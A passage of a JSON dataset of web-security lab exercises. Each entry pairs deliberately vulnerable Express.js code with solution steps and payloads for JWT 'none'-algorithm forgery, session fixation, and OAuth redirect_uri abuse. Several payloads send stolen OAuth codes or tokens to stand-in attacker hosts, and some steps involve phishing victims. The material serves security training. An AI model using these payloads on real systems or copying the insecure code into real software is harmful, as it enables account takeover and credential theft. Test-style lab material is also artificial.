      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation in REST-based login",
    "Lab Description": "This REST API authenticates users by issuing a session cookie. However, it does not invalidate or regenerate the session ID upon successful login. The application accepts a user-supplied session ID via a query parameter and binds it to a user after login. To solve: Fix a session for a victim and use it to hijack their session post-login.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to register a user account and observe the Set-Cookie: sessionId response.",
      "Send a GET /set-session?sid=attackerSession with Burp Repeater and verify the server accepts externally-supplied session IDs.",
      "Social engineer the victim to log in while using the attacker-controlled sessionId (sent via phishing link or iframe).",
      "Once the victim logs in, reuse the fixed sessionId to access /user/dashboard with the victim\u00e2\u20ac\u2122s privileges.",
      "Verify access to victim's account page with the attacker-fixed session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst uuid = require('uuid');\nconst app = express();\napp.use(cookieParser());\nconst sessions = {};\nconst users = { carlos: 'letmein' };\napp.get('/set-session', (req, res) => {\n  const sid = req.query.sid || uuid.v4();\n  res.cookie('sessionId', sid);\n  res.send(`Session fixed: ${sid}`);\n});\napp.post('/login', (req, res) => {\n  const { username, password } = req.query;\n  const sid = req.cookies.sessionId;\n  if (users[username] === password) {\n    sessions[sid] = username;\n    return res.send('Login successful');\n  }\n  res.status(403).send('Invalid credentials');\n});\napp.get('/user/dashboard', (req, res) => {\n  const sid = req.cookies.sessionId;\n  if (sessions[sid]) return res.send(`Welcome ${sessions[sid]}`);\n  res.status(403).send('Not logged in');\n});\napp.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "GET /set-session?sid=evilSID",
      "POST /login?username=carlos&password=letmein (with Cookie: sessionId=evilSID)",
      "GET /user/dashboard (with Cookie: sessionId=evilSID)"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in third-party login",
    "Lab Description": "This application allows third-party OAuth login via a vulnerable endpoint that accepts the `redirect_uri` parameter from the user without validation. The application trusts the `email` claim from the OAuth provider without verifying its source. To solve: Exploit the misconfiguration to impersonate the victim via a forged email claim and access their account dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the OAuth login flow and inspect the redirect_uri parameter and OAuth token response.",
      "Manipulate the redirect_uri to a malicious server you control that logs the OAuth token response.",
      "Modify the email claim in the OAuth response JWT to `carlos@lab.local` and sign it using none algorithm.",
      "Send the forged token to the /oauth/callback endpoint via a crafted GET request.",
      "Verify that access to Carlos\u00e2\u20ac\u2122s account page is granted using the forged identity."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.get('/oauth/callback', (req, res) => {\n  const token = req.query.token;\n  try {\n    const decoded = jwt.decode(token, { complete: true });\n    const userEmail = decoded.payload.email;\n    if (userEmail.endsWith('@lab.local')) {\n      return res.send(`Logged in as ${userEmail}`);\n    }\n    res.status(403).send('Access denied');\n  } catch (err) {\n    res.status(400).send('Invalid token');\n  }\n});\napp.listen(4000, () => console.log('OAuth Misconfiguration Lab running on port 4000'));",
    "payloads": [
      "GET /oauth/callback?token=eyJhbGciOiJub25lIn0.eyJlbWFpbCI6ImNhcmxvc0BsYWIubG9jYWwifQ.",
      "GET /oauth/callback?token=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwgImVtYWlsIjoiY2FybG9zQGxhYi5sb2NhbCJ9.",
      "GET /oauth/callback?token=eyJhbGciOiJub25lIn0.eyJlbWFpbCI6ImNhcmxvc0BsYWIubG9jYWwiLCAibmFtZSI6IkNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Session Fixation in Login Redirection Flow",
    "Lab Description": "This lab's login flow is vulnerable to session fixation due to improper session regeneration. The application uses a session cookie that is preserved across unauthenticated and authenticated states. To solve: hijack Carlos's authenticated session using a fixed session ID and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept login page using Burp Suite and observe session cookie `sessionid` being set before authentication.",
      "Send crafted login link with fixed session ID to the victim (simulated using Postman).",
      "Victim logs in and the same `sessionid` persists due to missing regeneration.",
      "Reuse fixed session ID in your browser using Burp Suite's cookie editor.",
      "Visit /my-account and confirm access to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(session({ secret: 'secret123', resave: false, saveUninitialized: true }));\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst users = [{ username: 'carlos', password: 'hunter2' }];\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    req.session.user = user.username;\n    res.redirect('/my-account');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/my-account', (req, res) => {\n  if (req.session.user) {\n    res.send(`Welcome ${req.session.user}, this is your account page.`);\n  } else {\n    res.redirect('/login');\n  }\n});\n\napp.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "Set-Cookie: sessionid=fixedSession123;",
      "POST /login with intercepted session ID preserved",
      "GET /my-account with sessionid=fixedSession123"
    ]
  },
  {
    "Lab scenario": "JWT Tampering in GraphQL API Authentication",
    "Lab Description": "This application uses JWT tokens to authorize users through its GraphQL login mutation. The backend fails to verify the `alg` field properly, allowing a `none` algorithm attack. To solve: forge a JWT to impersonate Carlos and access the admin dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send GraphQL introspection query and find login mutation and JWT structure.",
      "Capture a valid JWT using Burp Suite after logging in with any account.",
      "Base64-decode the header and set `alg` to `none`, set payload `username` to `carlos`, remove the signature part.",
      "Send tampered JWT in Authorization header via Burp Repeater.",
      "Access /admin-dashboard endpoint to verify Carlos impersonation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.json());\n\nconst users = [{ username: 'carlos', password: 'admin123' }];\n\napp.post('/graphql', (req, res) => {\n  const { query } = req.body;\n  if (query.includes('login')) {\n    const token = jwt.sign({ username: 'carlos' }, 'shhh');\n    res.json({ data: { login: { token } } });\n  } else if (query.includes('getAdminData')) {\n    const token = req.headers.authorization?.split(' ')[1];\n    const decoded = jwt.decode(token, { complete: true });\n    if (decoded.payload.username === 'carlos') {\n      res.json({ data: 'Top Secret Admin Content' });\n    } else {\n      res.status(403).send('Unauthorized');\n    }\n  }\n});\n\napp.listen(4001, () => console.log('JWT Tamper Lab running on http://localhost:4001'));",
    "payloads": [
      "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
      "Payload: { \"username\": \"carlos\" }",
      "JWT: base64(header).base64(payload). (no signature)",
      "Authorization: Bearer <tampered-jwt>"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Redirect URI Handling",
    "Lab Description": "This app implements OAuth login using a third-party provider but fails to validate redirect URIs securely. The misconfiguration allows stealing authorization codes via open redirect abuse. To solve: capture Carlos\u00e2\u20ac\u2122s OAuth code and use it to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept OAuth login and locate the `redirect_uri` parameter.",
      "Craft a malicious `redirect_uri` pointing to your server using a request to the login flow.",
      "Simulate Carlos clicking the crafted OAuth link via Postman or a phishing simulation.",
      "Your server receives the intercepted OAuth `code` via query string.",
      "Exchange stolen code at the real OAuth token endpoint to retrieve access_token and login as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst request = require('request');\nconst app = express();\n\nconst clientID = 'xyz123';\nconst clientSecret = 'supersecret';\n\napp.get('/auth/callback', (req, res) => {\n  const code = req.query.code;\n  const redirectUri = req.query.redirect_uri;\n  const tokenURL = `https://oauth.example.com/token?code=${code}&client_id=${clientID}&client_secret=${clientSecret}`;\n\n  request.get(tokenURL, (err, _, body) => {\n    if (body.includes('access_token')) {\n      res.send(`Welcome back! OAuth token received for user.`);\n    } else {\n      res.status(500).send('OAuth failed');\n    }\n  });\n});\n\napp.listen(4002, () => console.log('OAuth Redirect Lab running on http://localhost:4002'));",
    "payloads": [
      "OAuth URL with redirect_uri=https://attacker.com/steal?code=\u00c2\u00a7code\u00c2\u00a7",
      "GET https://oauth.example.com/token?code=intercepted-code&client_id=xyz123&client_secret=supersecret",
      "Authorization: Bearer <access_token>"
    ]
  },
  {
    "Lab scenario": "JWT signature algorithm confusion in login endpoint",
    "Lab Description": "The login endpoint of this REST API accepts JWTs for session validation. However, due to misconfigured signature verification, the server improperly accepts unsigned tokens when 'alg' is set to 'none'. The application trusts this token without verifying its signature. To solve: Forge a valid JWT for the admin user and access their account page without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a login request and observe the Authorization header containing the JWT.",
      "2. Decode the JWT using jwt.io or Postman. Note the 'alg' header value is 'HS256'.",
      "3. Modify the JWT header to set 'alg' to 'none' and remove the signature part completely.",
      "4. Change the payload's 'username' field to 'admin'.",
      "5. Send the tampered JWT in the Authorization header using Postman to /api/user-info and verify admin access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/user-info', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { const user = decoded.payload.username; return res.send(`Welcome ${user}`); } try { const verified = jwt.verify(token, 'supersecret'); return res.send(`Welcome ${verified.username}`); } catch (err) { return res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Bypass Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "Authorization: Bearer [forged_token_here]"
    ]
  },
  {
    "Lab scenario": "Session fixation via cookie reuse in login flow",
    "Lab Description": "This application sets a session cookie before user authentication, but fails to rotate it post-login. This allows a malicious actor to fix a session ID and later force the victim to use it, enabling full session hijack. To solve: Fix a session ID for Carlos and hijack his session using it.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to intercept the GET /login page request and observe the Set-Cookie header.",
      "2. Copy the pre-login session cookie value, e.g., session=xyz123.",
      "3. Craft a phishing page that sets document.cookie = 'session=xyz123'; and lures Carlos to login.",
      "4. After Carlos logs in, reuse the session cookie (xyz123) in a GET /my-account request using Burp Repeater.",
      "5. Confirm Carlos\u00e2\u20ac\u2122s account data is accessible."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'carlos123' }]; app.get('/login', (req, res) => { const sessionId = Math.random().toString(36).substring(2); res.cookie('session', sessionId); sessions[sessionId] = { authenticated: false }; res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessionId = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (user && sessionId) { sessions[sessionId].authenticated = true; sessions[sessionId].user = username; res.send(`Welcome ${username}`); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.session]; if (session && session.authenticated) res.send(`Account page for ${session.user}`); else res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Set-Cookie: session=xyz123;",
      "document.cookie = 'session=xyz123'; // phishing payload",
      "GET /my-account with Cookie: session=xyz123"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration allows account takeover via unvalidated redirect URI",
    "Lab Description": "This app uses OAuth to authenticate users with a third-party provider. Due to misconfigured redirect URI validation, an attacker can manipulate the redirect_uri parameter to send the authorization code to their own server. To solve: Intercept and steal Carlos's OAuth authorization code and exchange it to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp to intercept the /auth/login request and observe the redirect_uri parameter passed to the OAuth provider.",
      "2. Modify this parameter to your controlled domain, e.g., https://attacker.com/callback.",
      "3. Trick Carlos into visiting the modified login URL.",
      "4. Capture the OAuth code sent to your server and exchange it using Postman at /auth/token endpoint.",
      "5. Use the returned access_token to call /api/user-info and confirm access to Carlos\u00e2\u20ac\u2122s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth/login', (req, res) => { const redirectUri = req.query.redirect_uri; const authUrl = `https://provider.com/auth?client_id=abc123&redirect_uri=${redirectUri}&response_type=code`; res.redirect(authUrl); }); app.get('/auth/callback', async (req, res) => { const { code } = req.query; const tokenResponse = await axios.post('https://provider.com/token', { code, client_id: 'abc123', client_secret: 'secret', redirect_uri: 'https://vulnerable-app.com/auth/callback' }); const accessToken = tokenResponse.data.access_token; const userInfo = await axios.get('https://provider.com/userinfo', { headers: { Authorization: `Bearer ${accessToken}` } }); res.send(`Welcome ${userInfo.data.email}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Misconfig Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable-app.com/auth/login?redirect_uri=https://attacker.com/callback",
      "GET https://attacker.com/callback?code=stolen-oauth-code",
      "POST /auth/token with stolen code to retrieve access_token"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm bypass in GraphQL mutation",
    "Lab Description": "The application uses JWT for session management, embedded in a GraphQL mutation API. Due to improper validation of the JWT 'alg' field, an attacker can sign tokens using the 'none' algorithm. The application fails to validate the algorithm properly and trusts any unsigned token. To solve: forge a JWT to impersonate the admin and retrieve their account data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a valid GraphQL mutation and extract the existing JWT from Authorization header.",
      "Decode the JWT using jwt.io or Postman to observe the algorithm (alg) and payload structure.",
      "Modify the payload to {\"username\":\"admin\"} and set 'alg' to 'none' in the header, remove the signature.",
      "Use Postman to send the GraphQL mutation with Authorization: Bearer <forged_token> to /graphql endpoint.",
      "Verify the response contains admin's data and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(bodyParser.json());\n\nconst users = [{ username: 'admin', role: 'admin' }, { username: 'guest', role: 'user' }];\n\napp.post('/graphql', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, 'secret', { algorithms: ['HS256', 'none'] });\n    const user = users.find(u => u.username === decoded.username);\n    if (!user) return res.status(403).send('Unauthorized');\n    res.json({ data: { userProfile: user } });\n  } catch (err) {\n    console.error('JWT decode error:', err);\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(4000, () => console.log('JWT None Algorithm Lab running at http://localhost:4000'));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"} | Payload: {\"username\":\"admin\"} | Signature: ''",
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "Use jwt.io to strip signature and manually edit the token"
    ]
  },
  {
    "Lab scenario": "Session fixation via OAuth state reuse",
    "Lab Description": "The application uses OAuth for SSO login but does not properly validate the OAuth 'state' parameter. This makes it vulnerable to session fixation. The attacker can initiate an OAuth flow and trick the victim into logging in with the attacker's session. To solve: hijack a session and access the victim's dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate an OAuth login in Burp Suite and capture the redirection URL with the 'state' parameter.",
      "Send the URL to the victim and wait for them to complete the login using the crafted state.",
      "Observe in your session that the application is now logged in as the victim.",
      "Use the session cookie or access token to fetch /dashboard and confirm victim's identity.",
      "Access /dashboard with the hijacked session to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst request = require('request');\nconst app = express();\napp.use(session({ secret: 'oauthfix', resave: false, saveUninitialized: true }));\n\napp.get('/login', (req, res) => {\n  const state = req.query.state || Math.random().toString(36).substring(2);\n  req.session.oauthState = state;\n  res.redirect(`https://oauth.example.com/auth?response_type=code&client_id=abc123&redirect_uri=http://localhost:4000/callback&state=${state}`);\n});\n\napp.get('/callback', (req, res) => {\n  if (req.query.code) {\n    // No validation of 'state'!\n    req.session.loggedInAs = 'victim';\n    res.redirect('/dashboard');\n  } else {\n    res.send('OAuth failed');\n  }\n});\n\napp.get('/dashboard', (req, res) => {\n  if (req.session.loggedInAs) {\n    res.send(`Welcome ${req.session.loggedInAs}!`);\n  } else {\n    res.status(403).send('Unauthorized');\n  }\n});\n\napp.listen(4000, () => console.log('OAuth State Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "http://localhost:4000/login?state=attackerFixedState",
      "Captured OAuth URL with state=attackerFixedState",
      "Hijack victim session using state reuse in OAuth redirect"
    ]
  },
  {
    "Lab scenario": "SOAP API session fixation via Set-Cookie override",
    "Lab Description": "The application uses a SOAP API for authentication and sets session cookies during login. A flaw allows overriding the session identifier via a crafted Set-Cookie header, leading to session fixation. To solve: fix a session for the victim and access their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to capture the SOAP Login request and observe the Set-Cookie response.",
      "Manually craft a POST login request with a predefined session ID using 'Cookie: sessionid=attacker123'.",
      "Send the crafted login URL to the victim, encouraging them to log in while your session is active.",
      "When the victim logs in, their session becomes linked to 'attacker123'.",
      "Use the same session ID to access /myaccount and confirm the victim is authenticated."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(bodyParser.text({ type: 'application/soap+xml' }));\napp.use(cookieParser());\n\nlet sessions = {};\n\napp.post('/soap-login', (req, res) => {\n  const soapRequest = req.body;\n  const match = soapRequest.match(/<username>(.*?)<\\/username><password>(.*?)<\\/password>/);\n  if (!match) return res.status(400).send('Invalid SOAP');\n\n  const [_, username, password] = match;\n  if (username === 'carlos' && password === 'password123') {\n    const sid = req.cookies.sessionid || 'session_' + Math.random().toString(36).substring(2);\n    sessions[sid] = username;\n    res.setHeader('Set-Cookie', `sessionid=${sid}`);\n    return res.send(`<soap:Envelope><soap:Body><loginResponse>Success</loginResponse></soap:Body></soap:Envelope>`);\n  }\n  res.send(`<soap:Envelope><soap:Body><loginResponse>Failure</loginResponse></soap:Body></soap:Envelope>`);\n});\n\napp.get('/myaccount', (req, res) => {\n  const user = sessions[req.cookies.sessionid];\n  if (!user) return res.status(403).send('Unauthorized');\n  res.send(`Account page for ${user}`);\n});\n\napp.listen(4000, () => console.log('SOAP Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "POST /soap-login with header Cookie: sessionid=attacker123",
      "SOAP Body: <username>carlos</username><password>password123</password>",
      "Access /myaccount with Cookie: sessionid=attacker123"
    ]
  },
  {
    "Lab scenario": "Session Fixation in SOAP Login API",
    "Lab Description": "The SOAP-based authentication system incorrectly maintains session identifiers across users. The application sets a session cookie during the initial request and does not regenerate it post-login. To solve: Hijack a victim's authenticated session by fixing a known session ID before login.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to send a SOAP login request for your own account and observe the JSESSIONID assigned in the response.",
      "Use Burp Repeater to send a crafted SOAP login request with a fixed JSESSIONID in the Cookie header.",
      "Send a malicious link containing the fixed JSESSIONID to the victim, prompting them to log in with it.",
      "Once the victim logs in, revisit the application using the fixed JSESSIONID to hijack their session.",
      "Access /account/overview using the hijacked session cookie to confirm account takeover."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.text({ type: 'text/xml' })); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'victim', password: 'vpass' }]; app.post('/soap-login', (req, res) => { const { headers, body } = req; const match = /<username>(.*?)<\\/username><password>(.*?)<\\/password>/s.exec(body); if (!match) return res.status(400).send('Malformed XML'); const [_, username, password] = match; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid credentials'); const sessionId = headers.cookie?.split('=')[1] || Math.random().toString(36).slice(2); sessions[sessionId] = username; res.setHeader('Set-Cookie', `JSESSIONID=${sessionId}`); res.send(`<login><status>success</status></login>`); }); app.get('/account/overview', (req, res) => { const username = sessions[req.cookies.JSESSIONID]; if (!username) return res.status(401).send('Not authenticated'); res.send(`Welcome back, ${username}`); }); app.listen(4000, () => console.log('Session Fixation SOAP lab running'));",
    "payloads": [
      "Cookie: JSESSIONID=fixedSessionId",
      "<?xml version='1.0'?><soap><username>victim</username><password>vpass</password></soap>"
    ]
  },
  {
    "Lab scenario": "JWT signature none algorithm tampering",
    "Lab Description": "The REST API uses JWT for authentication but does not validate the signature algorithm correctly. The backend accepts tokens with the `alg` header set to `none` and skips signature verification. To solve: Forge an administrative token and access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Log in as a normal user and intercept the Authorization Bearer token using Burp Suite.",
      "Decode the JWT at jwt.io and observe the structure and claims.",
      "Change the `alg` field in the header to `none` and add \"role\":\"admin\" in the payload.",
      "Remove the signature part and replay the token using Postman to the /admin endpoint.",
      "Access the /admin panel successfully with forged privileges to complete the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') return res.sendStatus(403); const token = jwt.sign({ username, role: 'user' }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Welcome Admin'); res.status(403).send('Forbidden'); }); app.listen(4001, () => console.log('JWT None Bypass Lab running'));",
    "payloads": [
      "{ \"alg\": \"none\" }.{ \"username\": \"user\", \"role\": \"admin\" }.",
      "Authorization: Bearer {forged_token}"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect and implicit flow",
    "Lab Description": "The OAuth integration uses the implicit flow without validating redirect URIs properly. This allows token interception via an attacker-controlled domain. To solve: Trick the victim into authorizing on your redirect URI, capture their token, and access their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze the OAuth login flow with Burp Suite and identify the authorization request URL.",
      "Modify the redirect_uri parameter to point to your malicious server (e.g., https://attacker.com/token-catcher).",
      "Send the crafted URL to the victim and simulate them clicking it (or use social engineering).",
      "Capture the access token via your server logs from the redirected request.",
      "Use Postman to call /api/user-info with the stolen token and confirm access to the victim\u00e2\u20ac\u2122s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, client_id } = req.query; if (!redirect_uri.startsWith('https://')) return res.status(400).send('Invalid redirect'); const token = Buffer.from('victim:access123').toString('base64'); res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/api/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (Buffer.from(token, 'base64').toString().startsWith('victim')) return res.send('Welcome, victim'); res.status(403).send('Invalid token'); }); app.listen(4002, () => console.log('OAuth Open Redirect Lab running'));",
    "payloads": [
      "https://auth.example.com/auth?client_id=xyz&redirect_uri=https://attacker.com/token-catcher&response_type=token",
      "Authorization: Bearer dmljdGltOmFjY2VzczEyMw=="
    ]
  },
  {
    "Lab scenario": "Session Fixation via Pre-Auth Token Reuse in Login Flow",
    "Lab Description": "The application mishandles session identifiers during the authentication process. It fails to regenerate session IDs upon login, allowing session fixation attacks. The application uses a fixed session cookie across unauthenticated and authenticated states. To solve: Hijack Carlos's session by fixing the session ID before they log in, then access their My Account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to observe that session cookies remain unchanged after login.",
      "Manually generate a valid session cookie before login using /auth/init and capture its value.",
      "Send the session ID to the victim via a crafted link to initiate login under that session.",
      "Wait for the victim to authenticate using your pre-fixed session ID.",
      "Reuse the session ID to access /my-account and confirm session hijack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'notregenerated', resave: true, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'supersecret' }]; app.get('/auth/init', (req, res) => { res.send('Session initialized'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); req.session.user = username; res.send(`Logged in as ${username}`); }); app.get('/my-account', (req, res) => { if (req.session.user !== 'carlos') return res.status(403).send('Forbidden'); res.send('Carlos Account Data'); }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
    "payloads": [
      "GET /auth/init to create session",
      "Use attacker-controlled link to send fixed session cookie",
      "GET /my-account with fixed session cookie"
    ]
  },
  {
    "Lab scenario": "JWT Key Confusion via Algorithm Downgrade in GraphQL API",
    "Lab Description": "The app uses JWTs to authorize GraphQL requests but does not enforce strict algorithm checking, accepting tokens signed with 'none'. This allows algorithm confusion where the attacker forges a token using 'none' to impersonate users. To solve: Access the sensitive data node for Carlos by forging a valid-looking JWT.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the Authorization header for a valid request.",
      "Notice the 'alg' in the JWT is 'HS256', but the server accepts 'none'.",
      "Modify the JWT to set 'alg' to 'none' and change the payload to { \"username\": \"carlos\" }.",
      "Remove the signature part entirely and resend the token.",
      "Access the GraphQL query `{account(username: \"carlos\") { secrets }}` using Postman with the modified token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', secrets: 'TopSecretData' }]; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { req.user = decoded.payload.username; } else { try { jwt.verify(token, 'secret'); req.user = decoded.payload.username; } catch (e) { return res.status(401).send('Invalid JWT'); } } const user = users.find(u => u.username === req.user); if (req.body.query.includes('account') && user) { return res.json({ data: { account: { secrets: user.secrets } } }); } res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('JWT Confusion Lab running on port 4000'));",
    "payloads": [
      "JWT: { \"alg\": \"none\", \"payload\": { \"username\": \"carlos\" } }",
      "Authorization: Bearer [header.payload.]",
      "GraphQL query: { account(username: \"carlos\") { secrets } }"
    ]
  },
  {
    "Lab scenario": "OAuth Authorization Code Interception via Open Redirect",
    "Lab Description": "The application integrates with a third-party OAuth provider but lacks validation on the redirect_uri parameter, enabling open redirect attacks. This allows intercepting the authorization code during OAuth login. To solve: Steal Carlos's OAuth authorization code and use it to log in as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to analyze the OAuth login flow and find an open redirect vulnerability in the redirect_uri parameter.",
      "Craft a malicious URL to redirect authorization code to your server (e.g., https://evil.com/log?code=...).",
      "Send the malicious link to Carlos and capture the code from incoming requests.",
      "Use Postman to exchange the stolen code for an access token by calling /oauth/token.",
      "Replay login with the obtained token and access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/login/oauth', (req, res) => { const redirect = req.query.redirect_uri; const state = req.query.state; const url = `https://auth-provider.com/authorize?client_id=app123&redirect_uri=${redirect}&state=${state}`; res.redirect(url); }); app.get('/oauth/callback', (req, res) => { const code = req.query.code; request.post('https://auth-provider.com/token', { form: { code, client_id: 'app123', client_secret: 'secret123' } }, (err, response, body) => { if (err) return res.status(500).send('Token exchange failed'); res.send('Logged in with OAuth'); }); }); app.get('/my-account', (req, res) => { res.send('Carlos Account Info'); }); app.listen(5000, () => console.log('OAuth Redirect Lab running on port 5000'));",
    "payloads": [
      "https://vulnerable-app.com/login/oauth?redirect_uri=https://evil.com/log",
      "Captured code=abc123",
      "POST /oauth/token with code=abc123",
      "Access /my-account with resulting token"
    ]
  },
  {
    "Lab scenario": "Session Fixation in Login Redirection Mechanism",
    "Lab Description": "The application incorrectly allows pre-authenticated session IDs to persist through login. An attacker can fix a session ID for a victim and hijack the session post-login. The application accepts session IDs via URL query parameters and uses them post-login. To solve: hijack Carlos\u00e2\u20ac\u2122s session by fixing a session ID and accessing his account page after login.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
